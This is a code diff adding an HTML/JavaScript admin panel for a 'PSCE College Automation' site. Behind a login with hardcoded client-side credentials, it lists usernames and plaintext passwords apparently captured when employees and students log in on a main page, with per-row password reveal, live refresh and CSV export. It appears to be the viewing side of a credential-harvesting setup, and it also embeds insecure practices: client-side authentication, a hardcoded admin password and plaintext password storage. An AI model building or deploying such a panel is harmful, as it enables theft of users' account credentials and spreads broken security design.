@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Admin Panel - PSCE College Automation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{
+      --bg:#0d1117;--surface:#161b22;--card:#21262d;--border:#30363d;
+      --accent:#58a6ff;--accent2:#3fb950;--danger:#f85149;--warning:#d29922;
+      --text:#e6edf3;--muted:#8b949e;--radius:12px;
+    }
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+
+    /* ---- OVERLAY ---- */
+    .overlay{
+      position:fixed;inset:0;
+      background:linear-gradient(135deg,#0d1117 0%,#1a2233 60%,#0d1117 100%);
+      display:flex;align-items:center;justify-content:center;z-index:9999;
+    }
+    .overlay.hidden{display:none;}
+
+    .login-card{
+      background:var(--card);border:1px solid var(--border);border-radius:18px;
+      padding:48px 40px;width:380px;
+      box-shadow:0 24px 64px rgba(0,0,0,.7);
+    }
+    .badge{
+      display:inline-flex;align-items:center;gap:6px;
+      background:rgba(88,166,255,.12);border:1px solid rgba(88,166,255,.3);
+      color:var(--accent);font-size:11px;font-weight:600;letter-spacing:.6px;
+      padding:4px 12px;border-radius:20px;text-transform:uppercase;margin-bottom:20px;
+    }
+    .login-card h1{
+      font-size:26px;font-weight:800;margin-bottom:6px;
+      background:linear-gradient(135deg,#e6edf3,var(--accent));
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    }
+    .login-card p{color:var(--muted);font-size:13px;margin-bottom:28px;}
+    .field{margin-bottom:18px;}
+    .field label{display:block;font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.6px;text-transform:uppercase;margin-bottom:8px;}
+    .field input{
+      width:100%;background:var(--surface);border:1px solid var(--border);
+      border-radius:8px;padding:11px 14px;color:var(--text);font-size:14px;
+      font-family:'Inter',sans-serif;outline:none;transition:border-color .2s,box-shadow .2s;
+    }
+    .field input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(88,166,255,.2);}
+    .btn-login{
+      width:100%;padding:13px;
+      background:linear-gradient(135deg,#58a6ff,#1f6feb);
+      border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:700;
+      cursor:pointer;letter-spacing:.3px;transition:opacity .2s,transform .15s;
+    }
+    .btn-login:hover{opacity:.9;transform:translateY(-1px);}
+    .login-error{
+      display:none;margin-top:14px;
+      background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.4);
+      color:var(--danger);padding:10px 14px;border-radius:8px;font-size:13px;text-align:center;
+    }
+    .login-error.show{display:block;}
+
+    /* ---- ADMIN PANEL ---- */
+    .panel{display:none;}
+    .panel.show{display:block;}
+
+    header{
+      background:var(--surface);border-bottom:1px solid var(--border);
+      padding:0 32px;display:flex;align-items:center;justify-content:space-between;
+      height:64px;position:sticky;top:0;z-index:100;
+    }
+    .logo{font-size:18px;font-weight:800;
+      background:linear-gradient(135deg,#e6edf3,var(--accent));
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    .hdr-right{display:flex;align-items:center;gap:14px;}
+    .admin-chip{
+      background:rgba(63,185,80,.12);border:1px solid rgba(63,185,80,.3);
+      color:var(--accent2);font-size:12px;font-weight:600;padding:5px 14px;border-radius:20px;
+    }
+    .btn-sm{padding:7px 16px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:1px solid;}
+    .btn-sm.red{background:rgba(248,81,73,.12);border-color:rgba(248,81,73,.35);color:var(--danger);}
+    .btn-sm.red:hover{background:rgba(248,81,73,.25);}
+    .btn-sm.green{background:rgba(63,185,80,.12);border-color:rgba(63,185,80,.35);color:var(--accent2);}
+    .btn-sm.green:hover{background:rgba(63,185,80,.25);}
+
+    main{padding:36px 32px;max-width:1400px;margin:0 auto;}
+    .stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:32px;}
+    .stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px 24px;transition:border-color .2s;}
+    .stat-card:hover{border-color:var(--accent);}
+    .stat-label{font-size:11px;color:var(--muted);font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-bottom:8px;}
+    .stat-value{font-size:36px;font-weight:800;}
+    .c-blue{color:var(--accent);}.c-green{color:var(--accent2);}.c-orange{color:var(--warning);}
+
+    .toolbar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:18px;}
+    .toolbar input[type="search"]{
+      flex:1;min-width:200px;background:var(--card);border:1px solid var(--border);
+      border-radius:8px;padding:10px 14px;color:var(--text);font-size:14px;
+      font-family:'Inter',sans-serif;outline:none;transition:border-color .2s;
+    }
+    .toolbar input[type="search"]:focus{border-color:var(--accent);}
+    .toolbar select{
+      background:var(--card);border:1px solid var(--border);border-radius:8px;
+      padding:10px 14px;color:var(--text);font-size:13px;font-family:'Inter',sans-serif;outline:none;cursor:pointer;
+    }
+
+    .table-wrap{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;}
+    table{width:100%;border-collapse:collapse;}
+    thead th{
+      background:var(--surface);padding:13px 18px;text-align:left;
+      font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.8px;text-transform:uppercase;
+      border-bottom:1px solid var(--border);
+    }
+    tbody tr{border-bottom:1px solid var(--border);transition:background .15s;}
+    tbody tr:last-child{border-bottom:none;}
+    tbody tr:hover{background:rgba(88,166,255,.05);}
+    tbody td{padding:13px 18px;font-size:13px;vertical-align:middle;}
+
+    .pbadge{display:inline-flex;align-items:center;font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;}
+    .pbadge.emp{background:rgba(88,166,255,.15);color:var(--accent);border:1px solid rgba(88,166,255,.3);}
+    .pbadge.stu{background:rgba(63,185,80,.15);color:var(--accent2);border:1px solid rgba(63,185,80,.3);}
+    .pbadge.oth{background:rgba(210,153,34,.15);color:var(--warning);border:1px solid rgba(210,153,34,.3);}
+
+    .pwd-cell{display:flex;align-items:center;gap:8px;}
+    .pwd-mask{font-family:monospace;letter-spacing:2px;color:var(--muted);}
+    .btn-eye{background:none;border:none;cursor:pointer;color:var(--muted);font-size:15px;transition:color .15s;padding:2px 5px;line-height:1;}
+    .btn-eye:hover{color:var(--text);}
+    .ts{color:var(--muted);font-size:12px;}
+
+    .no-data{text-align:center;padding:60px 20px;color:var(--muted);font-size:15px;}
+    .no-data .ico{font-size:48px;margin-bottom:12px;}
+
+    @media(max-width:640px){main{padding:18px 12px;}header{padding:0 14px;}}
+  </style>
+</head>
+<body>
+
+<!-- LOGIN OVERLAY -->
+<div class="overlay" id="overlay">
+  <div class="login-card">
+    <div class="badge">&#128100; Admin Access</div>
+    <h1>Admin Panel</h1>
+    <p>PSCE College Automation &mdash; Restricted Area</p>
+    <div class="field">
+      <label for="aUser">Username</label>
+      <input type="text" id="aUser" placeholder="admin" autocomplete="off"/>
+    </div>
+    <div class="field">
+      <label for="aPass">Password</label>
+      <input type="password" id="aPass" placeholder="Enter password"/>
+    </div>
+    <button class="btn-login" id="btnSignIn" onclick="doLogin()">Sign In</button>
+    <div class="login-error" id="loginErr">&#10060; Incorrect username or password.</div>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div class="panel" id="adminPanel">
+  <header>
+    <div class="logo">&#128196; PSCE Admin Panel</div>
+    <div class="hdr-right">
+      <span class="admin-chip">&#9679; Logged in as admin</span>
+      <button class="btn-sm green" onclick="exportCSV()">&#11015; Export CSV</button>
+      <button class="btn-sm red" onclick="doLogout()">Log Out</button>
+    </div>
+  </header>
+
+  <main>
+    <div class="stats-row">
+      <div class="stat-card"><div class="stat-label">Total Records</div><div class="stat-value c-blue" id="sTotal">0</div></div>
+      <div class="stat-card"><div class="stat-label">Employee Logins</div><div class="stat-value c-green" id="sEmp">0</div></div>
+      <div class="stat-card"><div class="stat-label">Student Logins</div><div class="stat-value c-blue" id="sStu">0</div></div>
+      <div class="stat-card"><div class="stat-label">Other Panel</div><div class="stat-value c-orange" id="sOth">0</div></div>
+    </div>
+
+    <div class="toolbar">
+      <input type="search" id="srch" placeholder="&#128269;  Search username or panel..." oninput="renderTable()"/>
+      <select id="fPanel" onchange="renderTable()">
+        <option value="">All Panels</option>
+        <option value="Employee">Employee</option>
+        <option value="Student">Student</option>
+        <option value="Other">Other</option>
+      </select>
+      <button class="btn-sm green" onclick="renderTable()">&#8635; Refresh</button>
+      <button class="btn-sm red" onclick="clearAll()">&#128465; Clear All</button>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Panel</th>
+            <th>Username / Roll No</th>
+            <th>Password</th>
+            <th>First Seen</th>
+          </tr>
+        </thead>
+        <tbody id="tBody"></tbody>
+      </table>
+      <div class="no-data" id="noData">
+        <div class="ico">&#128205;</div>
+        No login records found yet. They will appear here once users log in from the main page.
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+// ─── CONSTANTS ───────────────────────────────
+var AU = 'admin';
+var AP = 'S@mba';
+var SK = 'psce_login_records';
+var SESSION_KEY = 'psce_admin_session';
+
+// ─── INIT: check session on page load ────────
+(function init() {
+  if (sessionStorage.getItem(SESSION_KEY) === '1') {
+    showPanel();
+  }
+  // Enter key support
+  document.getElementById('aPass').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') doLogin();
+  });
+  document.getElementById('aUser').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') doLogin();
+  });
+})();
+
+// ─── AUTH ─────────────────────────────────────
+function doLogin() {
+  var u = document.getElementById('aUser').value.trim();
+  var p = document.getElementById('aPass').value;
+  if (u === AU && p === AP) {
+    sessionStorage.setItem(SESSION_KEY, '1');
+    document.getElementById('loginErr').classList.remove('show');
+    showPanel();
+  } else {
+    document.getElementById('loginErr').classList.add('show');
+    document.getElementById('aPass').value = '';
+    document.getElementById('aPass').focus();
+  }
+}
+
+function doLogout() {
+  sessionStorage.removeItem(SESSION_KEY);
+  document.getElementById('adminPanel').classList.remove('show');
+  document.getElementById('overlay').classList.remove('hidden');
+  document.getElementById('aUser').value = '';
+  document.getElementById('aPass').value = '';
+  document.getElementById('loginErr').classList.remove('show');
+}
+
+function showPanel() {
+  document.getElementById('overlay').classList.add('hidden');
+  document.getElementById('adminPanel').classList.add('show');
+  renderTable();
+}
+
+// ─── DATA ─────────────────────────────────────
+function loadRecords() {
+  try { return JSON.parse(localStorage.getItem(SK) || '[]'); } catch(e) { return []; }
+}
+
+// ─── RENDER TABLE ─────────────────────────────
+function renderTable() {
+  var records = loadRecords();
+  var srch  = (document.getElementById('srch').value || '').toLowerCase();
+  var panel = document.getElementById('fPanel').value;
+
+  var filtered = records.filter(function(r) {
+    var mp = !panel || r.panel === panel;
+    var ms = !srch || r.username.toLowerCase().indexOf(srch) >= 0 || r.panel.toLowerCase().indexOf(srch) >= 0;
+    return mp && ms;
+  });
+
+  document.getElementById('sTotal').textContent = records.length;
+  document.getElementById('sEmp').textContent   = records.filter(function(r){return r.panel==='Employee';}).length;
+  document.getElementById('sStu').textContent   = records.filter(function(r){return r.panel==='Student';}).length;
+  document.getElementById('sOth').textContent   = records.filter(function(r){return r.panel==='Other';}).length;
+
+  var tbody = document.getElementById('tBody');
+  tbody.innerHTML = '';
+  var noData = document.getElementById('noData');
+
+  if (filtered.length === 0) {
+    noData.style.display = 'block';
+    return;
+  }
+  noData.style.display = 'none';
+
+  filtered.forEach(function(r, i) {
+    var pc = r.panel === 'Employee' ? 'emp' : r.panel === 'Student' ? 'stu' : 'oth';
+    var dt = '';
+    try {
+      dt = new Date(r.ts).toLocaleString('en-IN', {
+        day:'2-digit', month:'short', year:'numeric',
+        hour:'2-digit', minute:'2-digit'
+      });
+    } catch(e) { dt = r.ts || ''; }
+
+    var rid = 'r' + i;
+    var tr  = document.createElement('tr');
+    tr.innerHTML =
+      '<td style="color:var(--muted);font-size:12px;">' + (i+1) + '</td>' +
+      '<td><span class="pbadge ' + pc + '">' + esc(r.panel) + '</span></td>' +
+      '<td style="font-weight:600;">' + esc(r.username) + '</td>' +
+      '<td>' +
+        '<div class="pwd-cell">' +
+          '<span class="pwd-mask" id="pm_' + rid + '">&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;</span>' +
+          '<button class="btn-eye" onclick="togglePwd(\'' + rid + '\',\'' + ea(r.password) + '\')">&#128065;</button>' +
+        '</div>' +
+      '</td>' +
+      '<td class="ts">' + dt + '</td>';
+    tbody.appendChild(tr);
+  });
+}
+
+function togglePwd(rid, plain) {
+  var el = document.getElementById('pm_' + rid);
+  if (el.dataset.shown === '1') {
+    el.innerHTML = '&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;';
+    el.style.color = 'var(--muted)';
+    el.dataset.shown = '0';
+  } else {
+    el.textContent = plain;
+    el.style.color = 'var(--text)';
+    el.dataset.shown = '1';
+  }
+}
+
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function ea(s) {
+  return String(s||'').replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+}
+
+// ─── ACTIONS ─────────────────────────────────
+function clearAll() {
+  if (confirm('Delete ALL login records? This cannot be undone.')) {
+    localStorage.removeItem(SK);
+    renderTable();
+  }
+}
+
+function exportCSV() {
+  var records = loadRecords();
+  if (!records.length) { alert('No records to export.'); return; }
+  var csv = 'Panel,Username / Roll No,Password,First Seen\n';
+  csv += records.map(function(r) {
+    return '"' + r.panel + '","' + r.username + '","' + r.password + '","' + new Date(r.ts).toLocaleString('en-IN') + '"';
+  }).join('\n');
+  var blob = new Blob([csv], { type: 'text/csv' });
+  var a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'psce_logins.csv';
+  a.click();
+}
+
+// ─── AUTO-REFRESH every 1s ───────────────────
+setInterval(function() {
+  if (sessionStorage.getItem(SESSION_KEY) === '1') renderTable();
+}, 1000);
+
+// ─── INSTANT UPDATE via storage event ────────
+// Fires when another tab/page writes to localStorage
+window.addEventListener('storage', function(e) {
+  if (e.key === SK && sessionStorage.getItem(SESSION_KEY) === '1') renderTable();
+});
+</script>
+</body>
+</html>
